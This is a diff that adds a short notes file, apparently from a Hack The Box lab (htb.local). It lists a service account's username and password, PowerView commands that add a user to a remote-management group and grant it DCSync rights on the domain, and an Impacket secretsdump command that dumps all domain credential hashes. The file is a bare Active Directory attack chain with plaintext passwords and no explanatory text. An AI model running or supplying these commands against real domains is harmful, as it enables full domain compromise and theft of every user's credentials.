@@ -1,0 +1,11 @@
+svc-alfresco
+s3rvice
+
+Add-DomainGroupMember -Identity "Remote Management Users" -Members 'phoenix'
+
+
+
+
+ Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity phoenix -Rights DCSync
+
+python secretsdump.py 'htb.local/phoenix:Password123!@10.10.10.61' -just-dc
